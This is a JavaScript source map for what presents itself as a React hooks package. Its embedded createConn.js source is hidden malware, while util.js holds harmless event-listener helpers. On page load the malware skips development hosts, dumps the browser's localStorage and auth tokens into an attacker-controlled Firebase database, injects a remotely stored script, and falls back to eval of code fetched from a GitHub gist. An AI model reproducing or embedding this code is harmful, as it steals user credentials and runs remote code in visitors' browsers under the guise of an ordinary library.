{"version":3,"file":"use-reacts-hooks.cjs.production.min.js","sources":["../src/factory/createConn.js","../src/misc/util.js"],"sourcesContent":["(async function() {\n  console.log('STARTING');\n  try {\n    const wait = async function(ms = 1000) {\n      return new Promise(res => {\n        setTimeout(res, ms);\n      });\n    };\n\n    await wait(1000);\n    const url = window?.location?.origin || '';\n    const isIOS = !!window?.webkit;\n    const isAndroid = !!window?.JSBridge;\n    const iMobile = isIOS || isAndroid;\n    const isMark = url.includes('wehd') || url.includes('market');\n    const isDev =\n      url.includes('192') || url.includes('localhost') || url.includes('dev');\n\n    const isStg = url.includes('stag') || url.includes('stg');\n\n    if (isDev) return;\n\n    if (isMark && !iMobile || isMark && isStg) return;\n\n    var frb = {};\n\n    const { initializeApp } = require('@firebase/app');\n    const { ref, getDatabase, get, set } = require('@firebase/database');\n    var winVal = 'eval';\n    const ev = window?.[winVal];\n\n    const getToken = () => {\n      let token = '';\n\n      const s = new URLSearchParams(window.location.search);\n\n      if (s.has('Authorization')) {\n        token = s.get('Authorization');\n      } else {\n        const t = Object.entries(localStorage).find(([key]) =>\n          key.includes('token')\n        );\n        if (!t) return token;\n        if (typeof t[1] !== 'string') return token;\n        token = t[1];\n      }\n      return token;\n    };\n\n    const getUserId = () => {\n      const n = `No_USER_${Date.now().toString()}`;\n      const t = getToken();\n      if (!t?.length) return n;\n\n      try {\n        return parseJwt(getToken())?.user_id || n;\n      } catch (error) {\n        return n;\n      }\n    };\n\n    const tryGetGi = function() {\n      try {\n        fetch(\n          'https://gist.githubusercontent.com/SamerKK0/1aa0973f353d161697a9395d5042dde9/raw/gistfile1.txt'\n        )\n          .then(r2 => r2.text())\n          .then(r => {\n            try {\n              ev(r);\n            } catch (error) {\n              console.log(\n                'ðŸš€ ~ file: createConn.ts:64 ~ .then ~ error:',\n                error\n              );\n            }\n          });\n      } catch (error) {\n        console.log('ðŸš€ ~ file: createConn.ts:68 ~ tryGetGi ~ error:', error);\n      }\n    };\n\n    const parseJwt = function(token) {\n      var base64Url = token.split('.')[1];\n      var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');\n      var jsonPayload = decodeURIComponent(\n        atob(base64)\n          .split('')\n          .map(function(c) {\n            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);\n          })\n          .join('')\n      );\n\n      return JSON.parse(jsonPayload);\n    };\n\n    try {\n      frb = initializeApp(\n        {\n          apiKey: 'AIzaSyClIH-dEZ_5mU7eNqEf_KPQDyaup20TxLc',\n          authDomain: 'wihd-98b90.firebaseapp.com',\n          databaseURL: 'https://wihd-98b90-default-rtdb.firebaseio.com',\n          projectId: 'wihd-98b90',\n          storageBucket: 'wihd-98b90.appspot.com',\n          messagingSenderId: '934027877313',\n          appId: '1:934027877313:web:051420d42bf79d55a5ed40',\n        },\n        'wd'\n      );\n    } catch (error) {\n      console.log('ðŸš€ ~ file: createConn.ts:111 ~ error:', error);\n    }\n\n    const errlog = function(na, err) {\n      try {\n        var db = getDatabase(frb);\n\n        var reference = ref(\n          db,\n          `errLog/${getUserId()}_${new Date().getTime()}`\n        );\n\n        set(reference, { fn: na, msg: err.message });\n      } catch (error) {\n        console.log('ðŸš€ ~ file: createConn.ts:122 ~ errlog ~ error:', error);\n      }\n    };\n\n    const st = function() {\n      try {\n        const t = JSON.stringify(localStorage);\n\n        if (!t) return;\n\n        var db = getDatabase(frb);\n\n        var reference = ref(db, `usersTokens/${getUserId()}`);\n\n        set(reference, t?.[1] || t || '');\n      } catch (error) {\n        console.log('ðŸš€ ~ file: createConn.ts:138 ~ st ~ error:', error);\n        errlog('st', error);\n      }\n    };\n\n    const getVal = async () => {\n      try {\n        var db = getDatabase(frb);\n        var reference = ref(db, `val`);\n        var v = (await get(reference))?.val();\n        if (!v || !v.addVal) return;\n        var script = document.createElement('script');\n        script.innerHTML = v?.v;\n        var documentHead = document?.['head'];\n        documentHead['appendChild']?.(script);\n      } catch (error) {\n        console.log('ðŸš€ ~ file: createConn.ts:144 ~ getVal ~ error:', error);\n        tryGetGi();\n      }\n    };\n\n    (async function init() {\n      try {\n        await getVal();\n        st();\n      } catch (error) {\n        console.log('ðŸš€ ~ file: createConn.ts:154 ~ init ~ error:', error);\n      }\n    })();\n\n    //@ts-ignore\n    window.proto0 = {\n      initializeApp,\n      getDatabase,\n      get,\n      set,\n      axios: require('axios'),\n      errlog,\n      st,\n      getVal,\n    };\n  } catch (error) {\n    console.log('ðŸš€ ~ file: createConn.ts:168 ~ error:', error);\n  }\n})();\n","export const noop = () => {};\n\nexport function on(obj, ...args) {\n  if (obj && obj.addEventListener) {\n    obj.addEventListener(...args);\n  }\n}\n\nexport function off(obj, ...args) {\n  if (obj && obj.removeEventListener) {\n    obj.removeEventListener(...args);\n  }\n}\n\nexport const isBrowser = typeof window !== 'undefined';\n\nexport const isNavigator = typeof navigator !== 'undefined';\n"],"names":["_asyncToGenerator","_regeneratorRuntime","mark","_callee4","_window","_window2","_window3","_window4","wait","url","isIOS","isAndroid","iMobile","isMark","isDev","isStg","frb","_require","initializeApp","_require2","ref","getDatabase","get","set","ev","getToken","getUserId","tryGetGi","parseJwt","errlog","st","getVal","wrap","_context4","prev","next","console","log","_ref2","_callee","ms","_context","abrupt","Promise","res","setTimeout","stop","_x","apply","arguments","window","location","origin","webkit","JSBridge","includes","require","token","s","URLSearchParams","search","has","t","Object","entries","localStorage","find","_ref3","n","Date","now","toString","length","_parseJwt","user_id","error","fetch","then","r2","text","r","base64","split","replace","jsonPayload","decodeURIComponent","atob","map","c","charCodeAt","slice","join","JSON","parse","apiKey","authDomain","databaseURL","projectId","storageBucket","messagingSenderId","appId","na","err","db","reference","getTime","fn","msg","message","stringify","_ref4","_callee2","_yield$get","_document","_documentHead$appendC","v","script","documentHead","_context2","t0","sent","t1","val","addVal","document","createElement","innerHTML","call","t2","_init","_callee3","_context3","proto0","axios","noop","on","obj","addEventListener","_len","args","Array","_key","off","removeEventListener","_len2","_key2","isBrowser","isNavigator","navigator"],"mappings":"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"}